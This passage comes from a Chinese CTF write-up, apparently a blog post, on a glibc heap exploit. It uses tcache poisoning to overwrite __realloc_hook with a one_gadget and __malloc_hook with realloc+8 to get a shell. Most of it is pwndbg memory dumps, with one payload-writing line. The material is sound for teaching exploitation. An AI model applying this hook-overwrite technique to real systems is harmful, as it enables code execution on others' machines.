class="number">0x0000000000000050</span></span><br><span class="line"><span class="number">0x555555756070</span>:	<span class="number">0x0000000000000050</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757260</span></span><br><span class="line"><span class="number">0x555555756090</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557560a0</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x5555557560d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; <span class="built_in">bin</span></span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [ <span class="number">98</span>]: <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"><span class="number">0x30</span> [ <span class="number">98</span>]: <span class="number">0x7ffff7dcfc1d</span> ◂— <span class="number">0xfff7a7b480000000</span></span><br><span class="line"><span class="number">0x40</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span> [ <span class="number">98</span>]: <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [ <span class="number">98</span>]: <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x5555557572b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span> [ <span class="number">98</span>]: <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x5555557572b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x90</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xa0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xb0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xc0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xd0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xe0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xf0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x110</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x120</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x130</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x140</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x150</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x160</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x170</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x180</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x190</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1a0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1b0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1c0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1d0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1e0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1f0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x200</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x210</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x220</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x230</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x240</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x250</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x260</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x270</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x280</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x290</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2a0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2b0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2c0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2d0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2e0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2f0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x300</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x310</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x320</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x330</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x340</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x350</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x360</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x370</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x380</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x390</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3a0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3b0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3c0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3d0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3e0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3f0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x400</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x555555757060</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757060</span> /* <span class="string">&#x27;`puUUU&#x27;</span> */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>为什么要写入 malloc_hook - 0x13 的地址，来看一下此处的内存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16gx <span class="number">0x00007ffff7dcfc1d</span></span><br><span class="line"><span class="number">0x7ffff7dcfc1d</span>:	<span class="number">0xfff7a7b480000000</span>	<span class="number">0xfff7a7c80000007f</span></span><br><span class="line"><span class="number">0x7ffff7dcfc2d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x000000000000007f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc3d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc4d</span> &lt;main_arena+<span class="number">13</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc5d</span> &lt;main_arena+<span class="number">29</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc6d</span> &lt;main_arena+<span class="number">45</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc7d</span> &lt;main_arena+<span class="number">61</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc8d</span> &lt;main_arena+<span class="number">77</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>这里的内存显示有点奇怪，但是让我想到 fastbin_attack 中的<strong>Arbitrary Alloc，详见：</strong><br>这里应该是为了绕过高版本 libc 中所加的对 tcache 的限制（其机制应该和 fastbin 的一模一样），这里不多说了。</p>
<h2 id="再次申请堆块，到-realloc-hook"><a href="#再次申请堆块，到-realloc-hook" class="headerlink" title="再次申请堆块，到__realloc_hook"></a>再次申请堆块，到__realloc_hook</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;C&#x27;</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>) + p64(one) + p64(realloc + <span class="number">8</span>))</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x61</span></span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757060</span></span><br><span class="line">Size: <span class="number">0x1f1</span></span><br><span class="line">fd: <span class="number">0x7ffff7dcfca0</span></span><br><span class="line">bk: <span class="number">0x7ffff7dcfca0</span></span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555557572b0</span></span><br><span class="line">Size: <span class="number">0x20d51</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/100gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x6262626262626162</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0xfff7a7b480000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000001f1</span></span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x00007ffff7dcfca0</span>	<span class="number">0x00007ffff7dcfca0</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x00000000000001f0</span>	<span class="number">0x0000000000000060</span></span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x000000000000000a</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x5555557572b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020d51</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x555555756060</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x0000005000000000</span>	<span class="number">0x0000000000000050</span></span><br><span class="line"><span class="number">0x555555756070</span>:	<span class="number">0x0000002000000050</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757260</span></span><br><span class="line"><span class="number">0x555555756090</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x5555557560a0</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x00007ffff7dcfc1d</span></span><br><span class="line"><span class="number">0x5555557560b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x00007ffff7dcfc1d</span></span><br><span class="line"><span class="number">0x7ffff7dcfc1d</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0xfff7aee45c434343</span></span><br><span class="line">    			<span class="comment">#payload从这里写入</span></span><br><span class="line"><span class="number">0x7ffff7dcfc2d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0xfff7a7cca800007f</span>	<span class="number">0x000000000a00007f</span></span><br><span class="line"><span class="number">0x7ffff7dcfc3d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc4d</span> &lt;main_arena+<span class="number">13</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc5d</span> &lt;main_arena+<span class="number">29</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc6d</span> &lt;main_arena+<span class="number">45</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc7d</span> &lt;main_arena+<span class="number">61</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc8d</span> &lt;main_arena+<span class="number">77</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">换个视角来看一下：</span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x00007ffff7dcfc10</span></span><br><span class="line"><span class="number">0x7ffff7dcfc10</span> &lt;_IO_wide_data_0+<span class="number">304</span>&gt;:	<span class="number">0x00007ffff7dcbd60</span>	<span class="number">0x4343430000000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x7ffff7dcfc20</span> &lt;__memalign_hook&gt;:	<span class="number">0x4343434343434343</span>	<span class="number">0x00007ffff7aee45c</span></span><br><span class="line">    													<span class="comment">#__realloc_hook</span></span><br><span class="line">        												<span class="comment">#现被写入one_gadget</span></span><br><span class="line"><span class="number">0x7ffff7dcfc30</span> &lt;__malloc_hook&gt;:	<span class="number">0x00007ffff7a7cca8</span>	<span class="number">0x000000000000000a</span></span><br><span class="line">    							<span class="comment">#_malloc_hook</span></span><br><span class="line">        						<span class="comment">#现被写入__libc_realloc</span></span><br><span class="line"><span class="number">0x7ffff7dcfc40</span> &lt;main_arena&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc50</span> &lt;main_arena+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc60</span> &lt;main_arena+<span class="number">32</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc70</span> &lt;main_arena+<span class="number">48</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dcfc80</span> &lt;main_arena+<span class="number">64</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; <span class="built_in">bin</span></span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [ <span class="number">98</span>]: <span class="number">0x6262626262626262</span> (<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"><span class="number">0x30</span> [ <span class="number">97</span>]: <span class="number">0xfff7a7b480000000</span></span><br><span class="line"><span class="number">0x40</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span> [ <span class="number">98</span>]: <span class="number">0x1f1</span></span><br><span class="line"><span class="number">0x60</span> [ <span class="number">98</span>]: <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x5555557572b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span> [ <span class="number">98</span>]: <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x5555557572b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x90</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xa0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xb0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xc0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xd0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xe0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xf0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x110</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x120</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x130</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x140</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x150</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x160</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x170</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x180</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x190</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1a0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1b0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1c0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1d0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1e0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1f0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x200</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x210</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x220</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x230</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x240</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x250</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x260</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x270</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x280</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x290</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2a0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2b0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2c0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2d0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2e0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2f0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x300</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x310</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x320</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x330</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x340</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x350</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x360</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x370</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x380</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x390</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3a0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3b0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3c0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3d0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3e0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x3f0</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x400</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [ <span class="number">98</span>]: <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x555555757060</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757060</span> /* <span class="string">&#x27;`puUUU&#x27;</span> */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>当再次 malloc 时就会 getshell：</p>
